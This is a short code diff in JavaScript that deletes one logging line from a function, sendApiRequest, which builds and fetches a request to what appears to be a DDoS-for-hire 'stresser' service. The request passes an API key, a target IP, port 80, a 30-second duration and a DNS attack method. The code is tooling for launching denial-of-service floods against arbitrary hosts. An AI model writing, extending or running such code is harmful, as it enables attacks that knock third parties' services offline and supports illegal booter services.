@@ -65,7 +65,6 @@ async function sendApiRequest(ip) {
     }
 
     const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}&port=80&time=30&method=DNS`;
-    console.log(`URL da API: ${url}`);
 
     try {
         const response = await fetch(url, {
